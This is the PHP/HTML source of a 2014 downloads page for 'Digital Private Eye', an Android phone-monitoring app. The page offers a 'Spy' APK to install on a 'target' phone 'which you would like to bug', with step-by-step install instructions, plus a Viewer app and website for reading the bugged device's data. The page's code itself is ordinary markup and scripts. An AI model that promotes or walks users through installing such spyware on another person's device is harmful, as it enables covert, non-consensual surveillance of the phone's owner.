<?php
CONST APPLICATION_INITIALS = 'DPEye';
CONST APPLICATION_WEBSITE = 'http://digitalprivateeye.com';
CONST APPLICATION_NAME = 'Digital Private Eye';
CONST APPLICATION_DOWNLOAD_URL = "https://play.google.com/store/apps/details?id=com.digitalprivateeyespy";
CONST OWNER = 'Made Software Ltd';
CONST FACEBOOK_URL = 'https://www.facebook.com/pages/Digital-Private-Eye/703312569701920';
CONST LOGO_LARGE = "<img src=\"img/sample/logo.png\" style=\"width: 50px\">";
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Downloads - <?=APPLICATION_NAME;?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- Le styles -->
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
    <!--[if IE 7]>
      <link rel="stylesheet" href="css/font-awesome-ie7.min.css">
    <![endif]-->
    <link rel="stylesheet" type="text/css" href="css/style.css" />

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Fav &amp; touch icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="img/sample/logo-144.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="img/sample/logo-114.png">
      <link rel="apple-touch-icon-precomposed" sizes="72x72" href="img/sample/logo-72.png">
                    <link rel="apple-touch-icon-precomposed" href="img/sample/logo-57.png">
                                   <link rel="shortcut icon" href="img/sample/logo.png">
    
  </head>

  <body>


  <?php
  include "nav.php";
  ?>
    
    <div class="clear"></div>
    
    <div class="container-wrapper container-top">
      <div class="container container-top">
        <div class="row">
          <div class="col-md-12 center">
            <h1>APK Downloads</h1>
          </div>
        </div><!-- end row -->
      </div><!-- end container -->
    </div><!-- end container wrapper -->
    
    <div class="container">
      <div class="row">
        <div class="col-md-3 bs-docs-nav-wrapper">
          <ul class="nav nav-pills nav-stacked bs-docs-nav" data-spy="affix" data-offset-top="250" data-offset-bottom="350">
            <li><a href="#spy" class="list-group-item">Digital Private Eye -Spy</a></li>
            <li><a href="#viewer" class="list-group-item">Digital Private Eye -Viewer</a></li>
            <li><a href="#access-view-website" class="list-group-item">Access Via Website</a></li>
            <li><a href="#android-version" class="list-group-item">Checking which Android version is running</a></li>
            <li><a href="#developer-options" class="list-group-item">Turning on Developer Options</a></li>
          </ul>
        </div>
        <div class="col-md-8 col-md-offset-1">
          <h2 id="spy">Digital Private Eye -Spy
              <a href="downloads/spy/DigitalPrivateEyeSpy.apk"> <img src="img/download-animated.gif" style="width: 220px;"></a>
          </h2>
          <p>Install this on an android phone which you would like to bug.
              <br />Download Digital Private Eye - Spy on a target android device
                and you can monitor it's data.
            </p>
          <ul class="fa-ul">
            <li><span class="fa fa-li fa-android"></span>
                Download Digital Private Eye - Spy on a target android device.
            </li>
            <li><span class="fa fa-li fa-android"></span>
                You might need to <a href="#developer-options">turn on developer options</a> on the device.
                Instructions are available further down this page.
            </li>
            <li><span class="fa fa-li fa-android"></span>
              <li>Click on the downloaded file <a href="downloads/spy/DigitalPrivateEyeSpy.apk">DigitalPrivateEyeSpy.apk</a>
            </li>
            <li><span class="fa fa-li fa-android"></span>
                When the installation completes, a registration form is displayed on the device.</li>
            <li><span class="fa fa-li fa-android"></span>
              <li>Enter YOUR EMAIL ADDRESS. You will need this to login to view the phone's data from this website or
                  the <a href="#viewer">DPEye Viewer app</a>.</li>
              </li>
              <li><span class="fa fa-li fa-android"></span>
              <li>Ensure you have put in the right email address and press enter.</li>
              </li>
              <li><span class="fa fa-li fa-android"></span>Register on the website to view the devices' data.</li>
              </li>
          </ul>
          <hr />
            <h2 id="viewer">Digital Private Eye -Viewer
                <a href="downloads/viewer/DigitalPrivateEyeClient.apk"> <img src="img/download-animated.gif" style="width: 220px;"></a>
            </h2>
            <p>Install this on an android device to conveniently view all your bugged device(s) data.</p>
            <ul class="fa-ul">
                <li><span class="fa fa-li fa-android"></span>Download Digital Private Eye - Viewer on your android device.</li>
                <li><span class="fa fa-li fa-android"></span>
                    You might need to <a href="#developer-options">turn on developer options</a> on the device.
                Instructions are available further down this page.
                </li>
                <li><span class="fa fa-li fa-android"></span>Click on the downloaded file to install Digital Private Eye - Viewer</a>.</li>
                <li><span class="fa fa-li fa-android"></span>Register with your email address.</li>
                <li><span class="fa fa-li fa-android"></span>If you have registered previously,
                    ensure that you register with the same email address and password.</li>
            </ul>
            <hr />

            <h2 id="access-view-website">Access Via Website</h2>
            <p>You can access data on your bugged devices by registering and logging in via this website.</p>
            <hr />

            <h2 id="android-version">Checking which Android version is running</h2>
            <p>Kit Kat, Jelly Bean, Ice Cream Sandwich, Honey Comb, oh man it can be so confusing to know what android version
                your device is running with all these different names and references.
                Luckily, checking out what OS version your device is currently running is a breeze and can be done at any time.
                Follow a few simple steps and you will know exactly what your device is running.
            </p>
            <p>
                <ul class="fa-ul">
                    <li><span class="fa fa-li fa-android"></span>Open your devices settings.</li>
                    <li><span class="fa fa-li fa-android"></span>Scroll to 'About Phone'.</li>
                    <li><span class="fa fa-li fa-android"></span>Look for line which says "Android Version".</li>
                </ul>
            </p>
            <hr />


            <h2 id="developer-options">Turning on Developer Options</h2>
            <p>Here are some videos showing how to turn on developer options for different android devices. If you are unsure
            which Android version you device is running, checkout out the <a href="#android-version">Checking which Android version is running</a>
            section of this website.</p><br /><br />
            <h2> Android 4.4 Kit Kat</h2>
            <p>
                <div id="four-point-four-iframe"> </div>
            </p>
            <br /><br />
            <h2> Android 4.1, 4.2, 4.3 (Jelly Bean)</h2>
            <p>
                <div id="four-point-three-iframe"> </div>
            </p>
            <br /><br />
            <h2> Android 4.0 (Ice Cream Sandwich)</h2>
            <p>
                <div id="four-point-zero-iframe"> </div>
            </p>
            <br /><br />
            <h2> Android 3.0, 3.1, 3.2 (Honey Comb)</h2>
            <p>
                <div id="three-point-zero-iframe"> </div>
            </p>
            <hr />


          <h2 id="scrollspy-credits">Credits</h2>
          <p>Thank you for your interest in <?=APPLICATION_NAME;?>.</p>
          <p>The application, the website, and APIs which are part of <?=APPLICATION_NAME;?> were developed by <?=OWNER;?>.</p>
          <p>&copy; Copyright 2014. All rights reserved.</p>
        </div>
      </div><!-- end row -->
    </div><!-- end container -->
    
    <div class="clear"></div>

    <?php
    include "footer.php";
    ?>

    <!-- Le javascript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/zion.js"></script>
    <script type="text/javascript">
      
        $(document).ready(function(){
          $("body").scrollspy({target: ".bs-docs-nav-wrapper", offset:50});
        });

        $(document).ready(function(){
            $("#four-point-four-iframe").html("<iframe width='100%' height='315' src='//www.youtube.com/embed/H_0ws9StCiA' frameborder='0' allowfullscreen></iframe>");
            $("#four-point-three-iframe").html("<iframe width='100%' height='315' src='//www.youtube.com/embed/lWEUH0KZ7ag' frameborder='0' allowfullscreen></iframe>");
            $("#four-point-zero-iframe").html("<iframe width='100%' height='315' src='//www.youtube.com/embed/aX-PJHdD5c4' frameborder='0' allowfullscreen></iframe>");
            $("#three-point-zero-iframe").html("<iframe width='100%' height='315' src='//www.youtube.com/embed/sqCGvQRZ8wY' frameborder='0' allowfullscreen></iframe>");
        });

    </script>

  </body>
</html>
